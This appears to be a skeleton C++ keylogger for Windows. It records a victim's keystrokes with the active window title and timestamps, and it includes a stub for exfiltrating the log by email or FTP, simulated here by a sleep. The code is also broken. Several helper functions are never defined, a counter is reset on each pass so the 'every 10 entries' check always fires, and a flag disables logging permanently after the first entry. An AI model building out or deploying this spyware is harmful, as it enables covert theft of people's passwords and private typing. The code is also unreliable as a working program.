#include <iostream>
#include <windows.h>

#define LOG_FILE "log.txt"
#define INTERVAL 1000 // milliseconds

std::string windowTitle;
bool loggingEnabled = true;

// Callback function for tracking active window title
void onWindowTitleChange(const std::string& newTitle) {
    windowTitle = newTitle;
}

// Function to send log file via email or FTP (simulated by sleep)
void exfiltrateLogFile() {
    // Simulate exfiltration with a short sleep
    Sleep(1000); // milliseconds

    // Reset logging after exfiltration
    loggingEnabled = true;
}

int main() {
    createLogFile();

    while (true) {
        if (!loggingEnabled) continue;

        // Get keyboard input and window title
        std::string victimKeyboardInput;
        GetKeyboardInput(victimKeyboardInput);

        // Create timestamp string
        std::string timestamp = getCurrentTimestamp();

        // Format log message with window title, victim's keyboard input, and timestamp
        std::string logMessage = "[" + timestamp + "] " +
            windowTitle + ": " + victimKeyboardInput;

        // Append log message to file
        writeToFile(logMessage);

        // Disable logging for 2 seconds
        loggingEnabled = false;
        
        // Exfiltrate log file after every 10 log entries
        int entryCount = 0;
        if (entryCount % 10 == 0) exfiltrateLogFile();
        
        Sleep(INTERVAL);
    }

    return 0;
}
